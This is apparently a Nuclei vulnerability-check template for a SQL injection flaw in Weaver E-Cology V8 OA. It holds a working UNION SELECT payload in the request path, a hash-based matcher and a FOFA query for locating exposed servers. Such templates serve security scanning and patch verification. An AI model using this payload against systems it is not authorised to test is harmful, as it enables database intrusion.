content:
id: ecology-HrmCareerApplyPerView-sql

info:
  name: Ecology V8 - SQL Injection
  author: cr
  severity: high
  reference:
    - https://github.com/coldrainh/nuclei-ByMyself/
  metadata:
    fofa-query: app="泛微-协同办公OA"
  tags: ecology,sqli

requests:
  - method: GET
    path:
      - "{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1+union+select+1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "0x900150983cd24fb0d6963f7d28e17f72"

      - type: status
        status:
          - 200
#fofa-query:app="泛微-协同办公OA"
help: 泛微OA E-Cology HrmCareerApplyPerView.jsp 文件存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感文件
